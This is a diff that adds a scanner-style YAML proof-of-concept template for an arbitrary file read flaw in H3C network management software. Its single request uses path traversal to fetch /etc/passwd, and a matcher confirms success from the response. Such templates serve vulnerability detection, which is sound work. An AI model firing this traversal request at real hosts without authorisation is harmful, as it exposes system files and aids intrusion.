@@ -1,0 +1,15 @@
+id: poc-yaml-h3c-sys-dia-data-down-file-read
+info:
+  name: H3C sys_dia_data_down 模块任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: H3C 用户网管登录系统
+requests:
+- method: GET
+  path: /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down
+  expression: "status_code == 200 && (\n       contains(body, \"root:\") && contains(body,\
+    \ \"/bin\") ||\n       contains(body, \"; for 16-bit app support\")\n       )\
+    \ && !contains(body, \"<\")\n"
+variables: {}
+transport: http
